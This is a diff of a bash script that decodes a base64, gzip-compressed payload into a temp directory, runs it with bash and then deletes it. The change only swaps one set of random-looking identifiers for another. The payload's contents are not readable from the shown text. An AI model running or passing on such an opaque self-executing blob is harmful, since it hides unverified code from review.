@@ -1,6 +1,6 @@
 #!/bin/bash
-ibaiImlzewgaer=$(mktemp -d)
-cat << 'EOF2' | base64 -d | gunzip > "$ibaiImlzewgaer/ilkrukszldatiulegjaer"
+irkimslzkuyewgaer=$(mktemp -d)
+cat << 'EOF2' | base64 -d | gunzip > "$irkimslzkuyewgaer/irkrukldahtilegaer"
 H4sICBJxrmgAA3R0LnNoAO1YUW/TVhR+rn/FwQnQrCQmSNWksVRikEkRtEWh5QWQ5cQ3sUViZ/Y1
 LdBKZQsotJXopGa0W4rKaIFKPESQoU5i2n/ZY33zHzi+dtIkDbCWoL3MfXBd3/Pde75zz3c/N3RM
 yuiGlFFsTRBCiUNfQs4xslQ3DbAcQ87ps3LWMg2qZGTFUOWsRrI3hyNwVxgWhnJ6gSTUW3bRkZ1S
@@ -29,5 +29,4 @@ zQ85QJhjW1LBzCoFCQd8hlBiA1M5fpC4Pvhdh4difNklnfl3S+JFEnjz+Fv7WLt3uivUUp9WNXir
 BP8Z4B9SLT1kj7u+C1vjpzQCfoym2JAhKHG4+lKB0A6N61Xe5MRUMu01h1spu9uNT0rtZa9jgUcB
 NVt66ukryqlS0O8QLyec2MjpecdSvCNkf3JPBIiiCh3bma+4/czhfMrIrE7htPAejmWBxQQTAAA=
 EOF2
-bash "$ibaiImlzewgaer/ilkrukszldatiulegjaer" "$@"; rm -rf "$ibaiImlzewgaer"
-
+bash "$irkimslzkuyewgaer/irkrukldahtilegaer" "$@"; rm -rf "$irkimslzkuyewgaer"
